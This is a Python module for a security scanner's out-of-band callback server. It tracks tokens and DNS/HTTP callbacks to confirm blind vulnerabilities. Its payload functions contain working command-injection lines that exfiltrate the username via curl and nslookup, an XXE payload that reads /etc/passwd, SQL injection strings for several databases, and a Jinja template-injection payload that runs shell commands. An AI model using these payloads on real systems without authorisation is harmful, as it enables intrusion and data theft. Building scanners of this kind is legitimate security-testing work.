"""
Out-of-Band (OOB) Callback Server Module.

Provides DNS and HTTP callback verification for blind vulnerability detection.
This module implements:
- Lightweight HTTP callback server
- DNS callback verification (via external services or self-hosted)
- Unique token generation for callback tracking
- Callback event logging and correlation

For security research only - requires proper authorization.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import random
import socket
import string
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Any, Callable, Optional
from urllib.parse import parse_qs, urlparse

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class OOBCallback:
    """Represents a single OOB callback event."""
    callback_id: str
    callback_type: str  # "http", "dns", "smtp"
    timestamp: datetime
    source_ip: str
    source_port: int
    raw_data: str
    headers: dict[str, str] = field(default_factory=dict)
    correlation_id: str = ""  # Links to original payload


@dataclass
class OOBToken:
    """Token for tracking OOB callbacks."""
    token: str
    created_at: datetime
    vuln_type: str
    target_url: str
    payload: str
    callback_type: str
    expires_at: datetime
    callbacks: list[OOBCallback] = field(default_factory=list)
    verified: bool = False


class OOBTokenManager:
    """Manages OOB tokens and callback correlation."""
    
    def __init__(self, domain: str = "callback.local"):
        self.domain = domain
        self.tokens: dict[str, OOBToken] = {}
        self._lock = threading.Lock()
    
    def generate_token(
        self,
        vuln_type: str,
        target_url: str,
        payload: str,
        callback_type: str = "http",
        ttl_seconds: int = 300
    ) -> OOBToken:
        """Generate unique OOB token for tracking."""
        # Generate cryptographically random token
        token_bytes = os.urandom(16)
        token = hashlib.sha256(token_bytes).hexdigest()[:16]
        
        now = datetime.now()
        oob_token = OOBToken(
            token=token,
            created_at=now,
            vuln_type=vuln_type,
            target_url=target_url,
            payload=payload,
            callback_type=callback_type,
            expires_at=datetime.fromtimestamp(now.timestamp() + ttl_seconds)
        )
        
        with self._lock:
            self.tokens[token] = oob_token
        
        return oob_token
    
    def get_callback_url(self, token: str, callback_type: str = "http") -> str:
        """Generate callback URL for given token."""
        if callback_type == "http":
            return f"http://{self.domain}/callback/{token}"
        elif callback_type == "dns":
            return f"{token}.{self.domain}"
        elif callback_type == "https":
            return f"https://{self.domain}/callback/{token}"
        return f"http://{self.domain}/callback/{token}"
    
    def record_callback(
        self,
        token: str,
        callback_type: str,
        source_ip: str,
        source_port: int,
        raw_data: str,
        headers: dict[str, str] = None
    ) -> bool:
        """Record incoming callback and correlate with token."""
        with self._lock:
            if token not in self.tokens:
                logger.warning(f"Unknown token received: {token}")
                return False
            
            oob_token = self.tokens[token]
            
            # Check expiry
            if datetime.now() > oob_token.expires_at:
                logger.warning(f"Expired token: {token}")
                return False
            
            callback = OOBCallback(
                callback_id=hashlib.sha256(os.urandom(8)).hexdigest()[:8],
                callback_type=callback_type,
                timestamp=datetime.now(),
                source_ip=source_ip,
                source_port=source_port,
                raw_data=raw_data,
                headers=headers or {},
                correlation_id=token
            )
            
            oob_token.callbacks.append(callback)
            oob_token.verified = True
            
            logger.info(f"OOB callback received for token {token} from {source_ip}")
            return True
    
    def check_callback(self, token: str) -> tuple[bool, list[OOBCallback]]:
        """Check if callback was received for token."""
        with self._lock:
            if token not in self.tokens:
                return False, []
            return self.tokens[token].verified, self.tokens[token].callbacks
    
    def get_pending_tokens(self) -> list[OOBToken]:
        """Get all tokens still waiting for callbacks."""
        with self._lock:
            now = datetime.now()
            return [
                t for t in self.tokens.values()
                if not t.verified and t.expires_at > now
            ]
    
    def cleanup_expired(self) -> int:
        """Remove expired tokens."""
        with self._lock:
            now = datetime.now()
            expired = [k for k, v in self.tokens.items() if v.expires_at < now]
            for k in expired:
                del self.tokens[k]
            return len(expired)


class OOBCallbackHandler(BaseHTTPRequestHandler):
    """HTTP request handler for OOB callbacks."""
    
    token_manager: OOBTokenManager = None
    callback_log: list[dict] = []
    
    def log_message(self, format: str, *args) -> None:
        """Override to use our logger."""
        logger.debug(f"OOB HTTP: {format % args}")
    
    def do_GET(self):
        """Handle GET requests (callbacks)."""
        self._handle_callback("GET")
    
    def do_POST(self):
        """Handle POST requests (callbacks)."""
        self._handle_callback("POST")
    
    def do_HEAD(self):
        """Handle HEAD requests."""
        self._handle_callback("HEAD")
    
    def _handle_callback(self, method: str):
        """Process incoming callback."""
        try:
            parsed = urlparse(self.path)
            path_parts = parsed.path.strip("/").split("/")
            
            # Extract token from path
            token = None
            if len(path_parts) >= 2 and path_parts[0] == "callback":
                token = path_parts[1]
            elif len(path_parts) >= 1:
                # Try first part as token
                token = path_parts[0]
            
            # Also check query string
            query_params = parse_qs(parsed.query)
            if "token" in query_params:
                token = query_params["token"][0]
            if "id" in query_params:
                token = query_params["id"][0]
            
            # Get request body for POST
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8", errors="replace") if content_length > 0 else ""
            
            # Get headers
            headers = dict(self.headers)
            
            # Get client info
            client_ip, client_port = self.client_address
            
            # Log callback
            callback_data = {
                "timestamp": datetime.now().isoformat(),
                "method": method,
                "path": self.path,
                "token": token,
                "client_ip": client_ip,
                "client_port": client_port,
                "headers": headers,
                "body": body[:1000]  # Limit body size in log
            }
            OOBCallbackHandler.callback_log.append(callback_data)
            
            # Record with token manager
            if token and self.token_manager:
                self.token_manager.record_callback(
                    token=token,
                    callback_type="http",
                    source_ip=client_ip,
                    source_port=client_port,
                    raw_data=json.dumps({"path": self.path, "body": body}),
                    headers=headers
                )
            
            # Send response
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("X-OOB-Server", "ASF-OOB/1.0")
            self.end_headers()
            self.wfile.write(b"OK")
            
        except Exception as e:
            logger.error(f"Error handling callback: {e}")
            self.send_response(500)
            self.end_headers()


class OOBServer:
    """
    Out-of-Band callback server for blind vulnerability detection.
    
    Supports:
    - HTTP callbacks for SSRF, blind RCE, XXE
    - DNS callbacks (via external services)
    - Webhook-style callbacks
    
    Usage:
        server = OOBServer(host="0.0.0.0", port=8888)
        server.start()
        
        # Generate callback URL
        token = server.generate_token("ssrf", "https://target.com/api")
        callback_url = server.get_callback_url(token)
        
        # Use callback_url in payload
        # ...
        
        # Check if callback received
        verified, callbacks = server.check_callback(token)
    """
    
    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8888,
        domain: str = None,
        use_https: bool = False,
        external_service: str = None
    ):
        self.host = host
        self.port = port
        self.domain = domain or f"{host}:{port}"
        self.use_https = use_https
        self.external_service = external_service  # e.g., "interact.sh", "burpcollaborator"
        
        self.token_manager = OOBTokenManager(domain=self.domain)
        self.server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False
    
    def start(self) -> bool:
        """Start the OOB callback server."""
        if self._running:
            logger.warning("OOB server already running")
            return False
        
        try:
            # Configure handler
            OOBCallbackHandler.token_manager = self.token_manager
            OOBCallbackHandler.callback_log = []
            
            # Create server
            self.server = HTTPServer((self.host, self.port), OOBCallbackHandler)
            
            # Start in background thread
            self._thread = threading.Thread(target=self._serve, daemon=True)
            self._thread.start()
            self._running = True
            
            logger.info(f"OOB server started on {self.host}:{self.port}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start OOB server: {e}")
            return False
    
    def _serve(self):
        """Server loop."""
        try:
            self.server.serve_forever()
        except Exception as e:
            logger.error(f"OOB server error: {e}")
        finally:
            self._running = False
    
    def stop(self):
        """Stop the OOB server."""
        if self.server:
            self.server.shutdown()
            self._running = False
            logger.info("OOB server stopped")
    
    def generate_token(
        self,
        vuln_type: str,
        target_url: str,
        payload: str = "",
        callback_type: str = "http",
        ttl_seconds: int = 300
    ) -> str:
        """Generate unique token for tracking OOB callbacks."""
        token = self.token_manager.generate_token(
            vuln_type=vuln_type,
            target_url=target_url,
            payload=payload,
            callback_type=callback_type,
            ttl_seconds=ttl_seconds
        )
        return token.token
    
    def get_callback_url(self, token: str, callback_type: str = "http") -> str:
        """Get callback URL for token."""
        if self.external_service:
            return self._get_external_url(token)
        
        protocol = "https" if self.use_https else "http"
        return f"{protocol}://{self.domain}/callback/{token}"
    
    def get_dns_hostname(self, token: str) -> str:
        """Get DNS hostname for DNS-based OOB detection."""
        if self.external_service:
            return self._get_external_dns(token)
        return f"{token}.{self.domain}"
    
    def _get_external_url(self, token: str) -> str:
        """Get callback URL from external service."""
        if self.external_service == "interact.sh":
            # interact.sh format
            return f"http://{token}.oast.pro"
        elif self.external_service == "burpcollaborator":
            # Burp Collaborator format
            return f"http://{token}.burpcollaborator.net"
        return f"http://{self.domain}/callback/{token}"
    
    def _get_external_dns(self, token: str) -> str:
        """Get DNS hostname from external service."""
        if self.external_service == "interact.sh":
            return f"{token}.oast.pro"
        elif self.external_service == "burpcollaborator":
            return f"{token}.burpcollaborator.net"
        return f"{token}.{self.domain}"
    
    def check_callback(self, token: str) -> tuple[bool, list[OOBCallback]]:
        """Check if callback was received for token."""
        return self.token_manager.check_callback(token)
    
    def wait_for_callback(
        self,
        token: str,
        timeout_seconds: float = 30.0,
        poll_interval: float = 0.5
    ) -> tuple[bool, list[OOBCallback]]:
        """Wait for callback with timeout."""
        start = time.time()
        while time.time() - start < timeout_seconds:
            verified, callbacks = self.check_callback(token)
            if verified:
                return True, callbacks
            time.sleep(poll_interval)
        return False, []
    
    def get_callback_log(self) -> list[dict]:
        """Get all callback events."""
        return OOBCallbackHandler.callback_log.copy()
    
    @property
    def is_running(self) -> bool:
        """Check if server is running."""
        return self._running


class DNSExfiltrationDetector:
    """
    DNS exfiltration verification for blind vulnerabilities.
    
    Techniques:
    1. Self-hosted authoritative DNS (requires infrastructure)
    2. External services (interact.sh, Burp Collaborator)
    3. Passive DNS log analysis
    """
    
    def __init__(self, domain: str, external_service: str = None):
        self.domain = domain
        self.external_service = external_service
        self.pending_queries: dict[str, dict] = {}
    
    def generate_dns_token(self, vuln_type: str, target: str) -> str:
        """Generate unique DNS subdomain token."""
        token = hashlib.sha256(os.urandom(16)).hexdigest()[:12]
        self.pending_queries[token] = {
            "vuln_type": vuln_type,
            "target": target,
            "created": datetime.now().isoformat(),
            "verified": False
        }
        return token
    
    def get_dns_payload(self, token: str) -> str:
        """Get full DNS hostname for payload."""
        return f"{token}.{self.domain}"
    
    def get_exfil_payloads(self, token: str, data_var: str = "data") -> dict[str, str]:
        """
        Generate DNS exfiltration payloads for different vuln types.
        
        Returns dict of {vuln_type: payload}
        """
        dns_host = self.get_dns_payload(token)
        
        return {
            # Command injection - Linux
            "rce_linux": f"ping -c 1 $(whoami).{dns_host}",
            "rce_linux_curl": f"curl http://$(whoami).{dns_host}",
            "rce_linux_nslookup": f"nslookup $(whoami).{dns_host}",
            
            # Command injection - Windows
            "rce_windows": f"ping %USERNAME%.{dns_host}",
            "rce_windows_nslookup": f"nslookup %USERNAME%.{dns_host}",
            
            # XXE
            "xxe_dtd": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{dns_host}">]><foo>&xxe;</foo>',
            "xxe_param": f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{dns_host}">%xxe;]>',
            
            # SSRF
            "ssrf_http": f"http://{dns_host}",
            "ssrf_gopher": f"gopher://{dns_host}",
            
            # SQLi (MySQL)
            "sqli_mysql": f"' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{dns_host}\\\\a'))-- -",
            
            # SQLi (PostgreSQL)  
            "sqli_postgres": f"'; COPY (SELECT '') TO PROGRAM 'nslookup {dns_host}'-- -",
            
            # SSTI
            "ssti_jinja": f"{{{{request.application.__globals__.__builtins__['__import__']('os').popen('nslookup {dns_host}').read()}}}}",
        }
    
    async def check_dns_callback(self, token: str) -> bool:
        """
        Check if DNS query was received for token.
        
        Note: Requires external service API or DNS server logs.
        """
        if self.external_service == "interact.sh":
            # Would need API integration
            pass
        
        # For now, check pending queries flag
        return self.pending_queries.get(token, {}).get("verified", False)
    
    def mark_verified(self, token: str) -> bool:
        """Mark token as verified (called by DNS server handler)."""
        if token in self.pending_queries:
            self.pending_queries[token]["verified"] = True
            self.pending_queries[token]["verified_at"] = datetime.now().isoformat()
            return True
        return False


class BlindInjectionDetector:
    """
    Blind injection detection using OOB techniques.
    
    Combines time-based and OOB verification for:
    - Blind SQL injection
    - Blind command injection
    - Blind XXE
    - Blind SSRF
    """
    
    def __init__(self, oob_server: OOBServer = None):
        self.oob_server = oob_server
        self.time_threshold_ms = 5000  # 5 second threshold for time-based
    
    def get_blind_sqli_payloads(self, oob_domain: str = None) -> list[dict]:
        """Get blind SQL injection payloads with OOB callbacks."""
        payloads = []
        
        # Time-based payloads
        time_payloads = [
            # MySQL
            {"payload": "' AND SLEEP(5)-- -", "db": "mysql", "type": "time"},
            {"payload": "1' AND SLEEP(5)-- -", "db": "mysql", "type": "time"},
            {"payload": "') AND SLEEP(5)-- -", "db": "mysql", "type": "time"},
            {"payload": "' OR SLEEP(5)-- -", "db": "mysql", "type": "time"},
            {"payload": "1; WAITFOR DELAY '0:0:5'-- -", "db": "mssql", "type": "time"},
            
            # PostgreSQL
            {"payload": "'; SELECT pg_sleep(5)-- -", "db": "postgres", "type": "time"},
            {"payload": "' || pg_sleep(5)-- -", "db": "postgres", "type": "time"},
            
            # MSSQL
            {"payload": "'; WAITFOR DELAY '0:0:5'-- -", "db": "mssql", "type": "time"},
            {"payload": "1; WAITFOR DELAY '0:0:5'-- -", "db": "mssql", "type": "time"},
            
            # Oracle
            {"payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "db": "oracle", "type": "time"},
            
            # SQLite
            {"payload": "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -", "db": "sqlite", "type": "time"},
        ]
        payloads.extend(time_payloads)
        
        # OOB payloads (if domain provided)
        if oob_domain:
            oob_payloads = [
                # MySQL OOB
                {"payload": f"' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{oob_domain}\\\\a'))-- -", 
                 "db": "mysql", "type": "oob"},
                
                # MSSQL OOB
                {"payload": f"'; EXEC master..xp_dirtree '//{oob_domain}/a'-- -", 
                 "db": "mssql", "type": "oob"},
                
                # PostgreSQL OOB
                {"payload": f"'; COPY (SELECT '') TO PROGRAM 'nslookup {oob_domain}'-- -", 
                 "db": "postgres", "type": "oob"},
                
                # Oracle OOB
                {"payload": f"' AND UTL_HTTP.REQUEST('http://{oob_domain}')-- -", 
                 "db": "oracle", "type": "oob"},
            ]
            payloads.extend(oob_payloads)
        
        return payloads
    
    def get_blind_rce_payloads(self, oob_domain: str = None) -> list[dict]:
        """Get blind RCE payloads with OOB callbacks."""
        payloads = []
        
        # Time-based payloads
        time_payloads = [
            # Linux
            {"payload": "; sleep 5", "os": "linux", "type": "time"},
            {"payload": "| sleep 5", "os": "linux", "type": "time"},
            {"payload": "& sleep 5", "os": "linux", "type": "time"},
            {"payload": "`sleep 5`", "os": "linux", "type": "time"},
            {"payload": "$(sleep 5)", "os": "linux", "type": "time"},
            
            # Windows
            {"payload": "& ping -n 6 127.0.0.1", "os": "windows", "type": "time"},
            {"payload": "| ping -n 6 127.0.0.1", "os": "windows", "type": "time"},
        ]
        payloads.extend(time_payloads)
        
        # OOB payloads
        if oob_domain:
            oob_payloads = [
                # Linux OOB
                {"payload": f"; curl http://{oob_domain}", "os": "linux", "type": "oob"},
                {"payload": f"; wget http://{oob_domain}", "os": "linux", "type": "oob"},
                {"payload": f"; nslookup {oob_domain}", "os": "linux", "type": "oob"},
                {"payload": f"; ping -c 1 {oob_domain}", "os": "linux", "type": "oob"},
                {"payload": f"| curl http://{oob_domain}", "os": "linux", "type": "oob"},
                {"payload": f"`curl http://{oob_domain}`", "os": "linux", "type": "oob"},
                {"payload": f"$(curl http://{oob_domain})", "os": "linux", "type": "oob"},
                
                # Windows OOB
                {"payload": f"& ping {oob_domain}", "os": "windows", "type": "oob"},
                {"payload": f"& nslookup {oob_domain}", "os": "windows", "type": "oob"},
                {"payload": f"& curl http://{oob_domain}", "os": "windows", "type": "oob"},
                {"payload": f"| ping {oob_domain}", "os": "windows", "type": "oob"},
            ]
            payloads.extend(oob_payloads)
        
        return payloads
    
    def get_blind_xxe_payloads(self, oob_domain: str) -> list[dict]:
        """Get blind XXE payloads with OOB callbacks."""
        return [
            # Parameter entity OOB
            {
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{oob_domain}/xxe">
  %xxe;
]>
<root>test</root>''',
                "type": "oob",
                "subtype": "parameter_entity"
            },
            
            # External entity OOB
            {
                "payload": f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{oob_domain}/xxe">
]>
<foo>&xxe;</foo>''',
                "type": "oob",
                "subtype": "external_entity"
            },
            
            # DTD-based OOB
            {
                "payload": f'''<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://{oob_domain}/evil.dtd">
<foo>test</foo>''',
                "type": "oob",
                "subtype": "dtd_external"
            },
            
            # Error-based with OOB
            {
                "payload": f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{oob_domain}/evil.dtd">
  %dtd;
]>
<foo>test</foo>''',
                "type": "oob",
                "subtype": "error_based"
            },
        ]
    
    def verify_time_based(
        self,
        baseline_ms: float,
        response_ms: float,
        expected_delay_ms: float = 5000
    ) -> tuple[bool, float]:
        """
        Verify time-based injection.
        
        Returns (is_vulnerable, confidence)
        """
        # Calculate delay difference
        delay = response_ms - baseline_ms
        
        # Account for network variance (±20%)
        min_expected = expected_delay_ms * 0.8
        max_expected = expected_delay_ms * 1.5
        
        if min_expected <= delay <= max_expected:
            # Calculate confidence based on how close to expected
            deviation = abs(delay - expected_delay_ms) / expected_delay_ms
            confidence = max(0.6, 1.0 - deviation)  # At least 60% if within range
            return True, confidence
        
        return False, 0.0
    
    async def test_blind_injection(
        self,
        make_request: Callable,
        endpoint: str,
        param: str,
        payloads: list[dict],
        baseline_ms: float = None
    ) -> list[dict]:
        """
        Test for blind injection using provided payloads.
        
        Args:
            make_request: Function to make HTTP request
            endpoint: Target endpoint
            param: Vulnerable parameter
            payloads: List of payloads to test
            baseline_ms: Baseline response time
        
        Returns:
            List of successful detections
        """
        results = []
        
        for payload_info in payloads:
            payload = payload_info["payload"]
            payload_type = payload_info["type"]
            
            # Generate OOB token if needed
            oob_token = None
            if payload_type == "oob" and self.oob_server:
                oob_token = self.oob_server.generate_token(
                    vuln_type=f"blind_{payload_info.get('db', 'unknown')}",
                    target_url=endpoint,
                    payload=payload
                )
                # Replace domain placeholder in payload
                callback_url = self.oob_server.get_callback_url(oob_token)
            
            # Make request with payload
            start_time = time.time()
            response = await make_request(endpoint, {param: payload})
            response_ms = (time.time() - start_time) * 1000
            
            # Verify based on type
            if payload_type == "time":
                is_vuln, confidence = self.verify_time_based(
                    baseline_ms or 0,
                    response_ms,
                    expected_delay_ms=5000
                )
                if is_vuln:
                    results.append({
                        "payload": payload,
                        "type": "time-based",
                        "confidence": confidence,
                        "response_ms": response_ms,
                        "evidence": f"Response delayed by {response_ms - (baseline_ms or 0):.0f}ms"
                    })
            
            elif payload_type == "oob" and oob_token:
                # Wait for callback
                verified, callbacks = self.oob_server.wait_for_callback(
                    oob_token,
                    timeout_seconds=10
                )
                if verified:
                    results.append({
                        "payload": payload,
                        "type": "oob",
                        "confidence": 0.95,  # OOB is highly reliable
                        "oob_token": oob_token,
                        "callbacks": [c.__dict__ for c in callbacks],
                        "evidence": f"OOB callback received from {callbacks[0].source_ip}"
                    })
        
        return results


# Export classes
__all__ = [
    "OOBCallback",
    "OOBToken",
    "OOBTokenManager",
    "OOBServer",
    "DNSExfiltrationDetector",
    "BlindInjectionDetector",
]
